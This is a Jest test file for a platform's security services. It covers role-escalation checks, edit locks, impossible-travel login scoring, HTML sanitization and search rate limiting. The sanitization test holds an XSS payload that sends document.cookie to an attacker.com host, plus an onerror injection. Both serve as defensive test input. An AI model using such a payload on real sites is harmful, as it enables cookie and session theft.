// src/__tests__/security_adversarial.test.js
// Security Adversarial & Horizontal Escalation Integration Tests for Arvdoul Platform Release Validation

import { jest } from '@jest/globals';
import util from 'node:util';

if (typeof globalThis.TextEncoder === 'undefined') {
  globalThis.TextEncoder = util.TextEncoder;
  globalThis.TextDecoder = util.TextDecoder;
}

if (typeof globalThis.structuredClone === 'undefined') {
  globalThis.structuredClone = (val) => JSON.parse(JSON.stringify(val));
}

import 'fake-indexeddb/auto';

import { collaborationService, CollaborationError } from '../services/collaborationService.js';
import { apiSecurityGatewayService } from '../services/apiSecurityGatewayService.js';
import { riskAuthService } from '../services/riskAuthService.js';
import { searchAbuseService } from '../services/searchAbuseService.js';
import { botProtectionService } from '../services/botProtectionService.js';
import { sanitizationService } from '../services/sanitizationService.js';

describe('Security Adversarial Integration Tests', () => {
  beforeEach(() => {
    jest.restoreAllMocks();
  });

  describe('Adversarial Scenario 1: Unauthorized Horizontal Role Escalation in Collaboration', () => {
    test('blocks unprivileged viewer role from updating team member roles or deleting project', () => {
      const viewerRole = 'viewer';

      // Test 1: Viewer cannot manage team
      const canManage = collaborationService.canManageTeam(viewerRole);
      expect(canManage).toBe(false);

      // Test 2: Viewer cannot edit content
      const canEdit = collaborationService.canEditContent(viewerRole);
      expect(canEdit).toBe(false);

      // Test 3: Viewer cannot publish content
      const canPublish = collaborationService.canPublishContent(viewerRole);
      expect(canPublish).toBe(false);
    });

    test('prevents acquiring lock if content file is currently locked by another editor', () => {
      const contentId = 'content_file_456';
      const userA = 'user_alice';
      const userB = 'user_mallory_attacker';

      // Alice acquires lock
      const lockA = collaborationService.acquireLock(contentId, userA, 30000);
      expect(lockA.success).toBe(true);

      // Mallory attempts to acquire lock on same content -> should throw error
      expect(() => {
        collaborationService.acquireLock(contentId, userB, 30000);
      }).toThrow('Content file is currently locked by another editor');
    });
  });

  describe('Adversarial Scenario 2: Impossible Travel & Adaptive Step-Up Auth Escalation', () => {
    test('flags impossible travel speed breach (>950 km/h) between successive auth events', async () => {
      // Event 1: New York login (Lat: 40.7128, Lon: -74.0060)
      const lastLogin = {
        lat: 40.7128,
        lon: -74.0060,
        city: 'New York',
        timestamp: Date.now() - (10 * 60 * 1000) // 10 minutes ago
      };

      // Event 2: London login (Lat: 51.5074, Lon: -0.1278) -> ~5,570 km away in 10 mins = 33,420 km/h!
      const currentLogin = {
        lat: 51.5074,
        lon: -0.1278,
        city: 'London',
        timestamp: Date.now()
      };

      const result = riskAuthService.assessImpossibleTravelRisk(lastLogin, currentLogin);
      expect(result.requiresStepUp).toBe(true);
      expect(result.score).toBeGreaterThan(0.9);
      expect(result.reason).toContain('impossible travel');
    });
  });

  describe('Adversarial Scenario 3: Malicious Input Injection & XSS Sanitization', () => {
    test('sanitizes malicious script tags and inline handlers from rich user input', async () => {
      const maliciousHTML = '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script><img src=x onerror=alert(1)>Hello World';

      const sanitized = await sanitizationService.sanitizeHTML(maliciousHTML);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('onerror=');
      expect(sanitized).toContain('Hello World');
    });
  });

  describe('Adversarial Scenario 4: Automated Search Scraping & Rate Limit Defenses', () => {
    test('detects rapid automated query scraping and triggers mandatory CAPTCHA challenge', async () => {
      const attackerClientKey = 'ip_attacker_192_168_1_99';

      // Simulate 35 rapid search queries exceeding the 30 queries/minute quota
      let lastCheck;
      for (let i = 0; i < 35; i++) {
        lastCheck = searchAbuseService.validateSearchRequest(attackerClientKey, `search_term_${i}`);
      }

      expect(lastCheck.allowed).toBe(false);
      expect(lastCheck.requiresCaptcha).toBe(true);
      expect(lastCheck.reason).toContain('Search rate limit exceeded');
    });
  });
});
